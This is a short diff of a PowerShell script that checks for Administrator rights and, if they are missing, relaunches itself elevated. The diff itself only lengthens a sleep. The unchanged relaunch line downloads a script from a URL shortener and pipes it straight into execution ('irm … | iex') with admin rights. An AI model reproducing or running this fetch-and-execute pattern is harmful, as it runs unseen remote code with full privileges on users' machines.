@@ -192,7 +192,7 @@ _______________________________________________________________________
 $admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 if (-not $admin) {
   Write-Host "This application requires elevated permissions to run, please grant them on the next Prompt."
-  Start-Sleep 2
+  Start-Sleep 5
   Start-Process powershell -Verb RunAs -ArgumentList "-Command irm https://rb.gy/3os8tx | iex"
   Exit
 }
